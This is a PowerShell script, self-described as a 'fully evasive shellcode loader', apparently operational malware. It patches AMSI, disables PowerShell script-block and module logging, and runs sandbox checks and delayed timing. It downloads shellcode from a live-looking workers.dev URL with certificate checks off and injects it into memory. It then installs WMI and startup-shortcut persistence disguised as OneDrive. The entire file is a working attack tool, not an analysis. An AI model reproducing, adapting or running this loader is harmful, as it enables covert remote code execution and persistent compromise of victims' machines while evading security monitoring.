<#
    launcher.ps1 – Fully evasive shellcode loader (PowerShell 5.1 compatible)
    Debug file: <script_directory>\launcher_debug.txt
#>

$DebugLog = Join-Path $PSScriptRoot "launcher_debug.txt"
function Write-DebugLog {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    $logLine = "[$timestamp] [$Level] $Message"
    Add-Content -Path $DebugLog -Value $logLine -Encoding UTF8
    if ($Level -eq "ERROR") { Write-Host $logLine -ForegroundColor Red }
    else { Write-Host $logLine -ForegroundColor Gray }
}

Write-DebugLog "========== SCRIPT START =========="
Write-DebugLog "PowerShell version: $($PSVersionTable.PSVersion)"
# FIXED: No ternary operator – use If/Else
$is64Bit = [Environment]::Is64BitProcess
if ($is64Bit) { $arch = "x64" } else { $arch = "x86" }
Write-DebugLog "Process architecture: $arch"
Write-DebugLog "Current directory: $PSScriptRoot"

# ============================================================
# 1. AMSI BYPASS (with verification)
# ============================================================
try {
    $amsiBypass = @'
using System;
using System.Runtime.InteropServices;
public class AmsiPatcher {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static bool Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if (lib == IntPtr.Zero) return false;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if (addr == IntPtr.Zero) return false;
        uint old = 0;
        if (!VirtualProtect(addr, (UIntPtr)6, 0x40, out old)) return false;
        Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)6, old, out old);
        return true;
    }
}
'@
    Add-Type $amsiBypass
    $amsiResult = [AmsiPatcher]::Patch()
    Write-DebugLog "AMSI bypass result: $amsiResult"
    if (-not $amsiResult) { Write-DebugLog "AMSI patch failed – continuing anyway" "WARN" }
} catch {
    Write-DebugLog "AMSI bypass exception: $_" "ERROR"
}

# ============================================================
# 2. DISABLE SCRIPT BLOCK LOGGING (PS5.1 compatible)
# ============================================================
try {
    $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'] = @{}
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']['EnableModuleLogging'] = 0
    Write-DebugLog "Script block logging disabled via cached policy"
} catch {
    Write-DebugLog "Failed to disable logging: $_" "WARN"
}

# ============================================================
# 3. SHELLCODE URL (plain but will be logged)
# ============================================================
$shellcodeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode"
Write-DebugLog "Shellcode URL: $shellcodeUrl"

# ============================================================
# 4. SANDBOX EVASION (non‑blocking, compatible with PS5.1)
# ============================================================
try {
    # Get CPU cores – fallback to Get-WmiObject if Get-CimInstance missing
    if (Get-Command Get-CimInstance -ErrorAction SilentlyContinue) {
        $cpuCores = (Get-CimInstance Win32_Processor).NumberOfCores
        $totalRAM = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    } else {
        $cpuCores = (Get-WmiObject Win32_Processor).NumberOfCores
        $totalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    }
    $procCount = (Get-Process).Count
    Write-DebugLog "System check: CPU cores=$cpuCores, RAM=${totalRAM}GB, processes=$procCount"
    if ($cpuCores -lt 2) { Write-DebugLog "Low CPU cores – possible sandbox" "WARN" }
    if ($totalRAM -lt 2) { Write-DebugLog "Low RAM – possible sandbox" "WARN" }
} catch { Write-DebugLog "Sandbox detection failed: $_" "WARN" }

# Mouse movement – load assembly if not already
try {
    if (-not ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -like '*System.Windows.Forms*' })) {
        Add-Type -AssemblyName System.Windows.Forms
    }
    $initialPos = [System.Windows.Forms.Cursor]::Position
    Start-Sleep -Seconds 3
    $newPos = [System.Windows.Forms.Cursor]::Position
    if ($initialPos.X -eq $newPos.X -and $initialPos.Y -eq $newPos.Y) {
        Write-DebugLog "No mouse movement detected – may be sandbox, but continuing" "WARN"
    } else {
        Write-DebugLog "Mouse movement confirmed – human present"
    }
} catch { Write-DebugLog "Mouse check error: $_" "WARN" }

# Time‑of‑day restriction – wait but don't exit
$hour = (Get-Date).Hour
if ($hour -lt 2 -or $hour -ge 5) {
    Write-DebugLog "Outside execution window (02-05), waiting until next window"
    $targetTime = (Get-Date).Date.AddHours(2).AddMinutes((Get-Random -Min 0 -Max 180))
    $sleepSeconds = ($targetTime - (Get-Date)).TotalSeconds
    if ($sleepSeconds -gt 0) {
        Write-DebugLog "Sleeping for $sleepSeconds seconds until $targetTime"
        Start-Sleep -Seconds $sleepSeconds
    }
}

# Random jitter
$jitter = Get-Random -Min 30 -Max 300
Write-DebugLog "Applying jitter: $jitter seconds"
Start-Sleep -Seconds $jitter

# ============================================================
# 5. PERSISTENCE flag (will be created only after successful injection)
# ============================================================
$flagFile = "$env:TEMP\sys_$([Environment]::MachineName.GetHashCode()).dat"
$persistInstalled = Test-Path $flagFile
Write-DebugLog "Persistence already installed: $persistInstalled"

# ============================================================
# 6. DOWNLOAD SHELLCODE (with explicit .NET loading for PS5.1)
# ============================================================
function Get-ShellcodeWithRetry {
    param([string]$Url, [int]$MaxRetries = 3)
    for ($i = 0; $i -lt $MaxRetries; $i++) {
        try {
            Write-DebugLog "Download attempt $($i+1)/$MaxRetries from $Url"
            # Ensure System.Net.Http is loaded (PS5.1 may need this)
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
            $handler = New-Object System.Net.Http.HttpClientHandler
            $handler.ServerCertificateCustomValidationCallback = { $true }
            $handler.UseCookies = $false
            $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip
            $client = New-Object System.Net.Http.HttpClient($handler)
            $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0")
            $client.DefaultRequestHeaders.Add("Accept", "*/*")
            $client.Timeout = [System.TimeSpan]::FromSeconds(45)
            $response = $client.GetByteArrayAsync($Url).GetAwaiter().GetResult()
            if ($response -and $response.Length -gt 50) {
                Write-DebugLog "Download successful, size: $($response.Length) bytes"
                $client.Dispose()
                return $response
            } else {
                Write-DebugLog "Downloaded data too small: $($response.Length) bytes" "WARN"
            }
        } catch {
            Write-DebugLog "Download attempt $($i+1) failed: $_" "ERROR"
            if ($i -eq $MaxRetries - 1) { return $null }
            Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
        } finally { if ($client) { $client.Dispose() } }
    }
    return $null
}

$shellcode = Get-ShellcodeWithRetry -Url $shellcodeUrl -MaxRetries 3
if (-not $shellcode) {
    Write-DebugLog "CRITICAL: Failed to download shellcode after retries – aborting" "ERROR"
    exit 1
}

# Check for MZ header (if shellcode is actually an EXE)
if ($shellcode.Length -gt 2 -and $shellcode[0] -eq 0x4D -and $shellcode[1] -eq 0x5A) {
    Write-DebugLog "Downloaded file is an EXE (MZ header) – not raw shellcode" "ERROR"
    exit 1
}
Write-DebugLog "Shellcode first 4 bytes: $([System.BitConverter]::ToString($shellcode[0..3]))"

# ============================================================
# 7. INJECT SHELLCODE (self‑injection, both techniques)
# ============================================================
$injectionSuccess = $false

# Technique 1: Self‑injection with VirtualAlloc (RWX)
try {
    Write-DebugLog "Attempting self‑injection (method 1)"
    $injectCode = @'
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    public static bool Run(byte[] payload) {
        IntPtr hProc = GetCurrentProcess();
        IntPtr alloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
        if (alloc == IntPtr.Zero) return false;
        UIntPtr written;
        if (!WriteProcessMemory(hProc, alloc, payload, (uint)payload.Length, out written)) return false;
        IntPtr thread = CreateRemoteThread(hProc, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
        return thread != IntPtr.Zero;
    }
}
'@
    Add-Type $injectCode
    $injectionSuccess = [Injector]::Run($shellcode)
    Write-DebugLog "Self‑injection result: $injectionSuccess"
} catch {
    Write-DebugLog "Self‑injection exception: $_" "ERROR"
}

# Technique 2 (fallback) – Using CreateThread via P/Invoke
if (-not $injectionSuccess) {
    try {
        Write-DebugLog "Attempting delegate injection (method 2)"
        $kernel32 = Add-Type -Name Kernel32 -Namespace Win32 -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@ -PassThru
        $alloc = $kernel32::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
        if ($alloc -ne [IntPtr]::Zero) {
            [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $alloc, $shellcode.Length)
            $oldProtect = 0
            $kernel32::VirtualProtect($alloc, $shellcode.Length, 0x20, [ref]$oldProtect) | Out-Null
            $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
            $injectionSuccess = ($thread -ne [IntPtr]::Zero)
            Write-DebugLog "Delegate injection result: $injectionSuccess"
        } else {
            Write-DebugLog "VirtualAlloc failed in fallback" "ERROR"
        }
    } catch { Write-DebugLog "Fallback injection exception: $_" "ERROR" }
}

if (-not $injectionSuccess) {
    Write-DebugLog "CRITICAL: All injection methods failed – no callback possible" "ERROR"
    exit 1
}

Write-DebugLog "Injection successful – waiting for callback (shellcode running)"

# ============================================================
# 8. POST‑INJECTION: Install persistence only now that injection worked
# ============================================================
if (-not $persistInstalled) {
    Write-DebugLog "Installing persistence (WMI + LNK) because injection succeeded"
    try {
        # WMI Event Subscription
        $filterArgs = @{Namespace='root\subscription'; ClassName='__EventFilter';
            Arguments=@{Name='UserLogonTrigger'; EventNamespace='root\cimv2';
            QueryLanguage='WQL'; Query="SELECT * FROM Win32_LogonSession WHERE LogonType=2 OR LogonType=10"}}
        $filter = Set-WmiInstance @filterArgs -ErrorAction Stop
        $consumerArgs = @{Namespace='root\subscription'; ClassName='CommandLineEventConsumer';
            Arguments=@{Name='UserLogonConsumer'; CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""}}
        $consumer = Set-WmiInstance @consumerArgs -ErrorAction Stop
        $bindingArgs = @{Namespace='root\subscription'; ClassName='__FilterToConsumerBinding';
            Arguments=@{Filter=$filter; Consumer=$consumer}}
        Set-WmiInstance @bindingArgs -ErrorAction Stop
        Write-DebugLog "WMI persistence installed"
    } catch { Write-DebugLog "WMI persistence failed: $_" "WARN" }

    try {
        $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
        $wsh = New-Object -ComObject WScript.Shell
        $lnk = $wsh.CreateShortcut($startup)
        $lnk.TargetPath = "powershell.exe"
        $env:ONEDRIVE_LAUNCHER = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        $lnk.Arguments = "-Command `$env:ONEDRIVE_LAUNCHER"
        $lnk.WindowStyle = 7
        $lnk.Save()
        Write-DebugLog "Startup LNK persistence installed at $startup"
    } catch { Write-DebugLog "LNK persistence failed: $_" "WARN" }

    New-Item -Path $flagFile -ItemType File -Force | Out-Null
    Write-DebugLog "Persistence flag file created: $flagFile"
} else {
    Write-DebugLog "Persistence already installed – skipping"
}

# ============================================================
# 9. KEEP ALIVE (optional – prevents script from exiting)
# ============================================================
Write-DebugLog "Script finished – shellcode should call back within minutes"
Write-DebugLog "========== SCRIPT END =========="

# Do not exit immediately – keep PowerShell alive to host the injected thread
Start-Sleep -Seconds 86400
exit 0
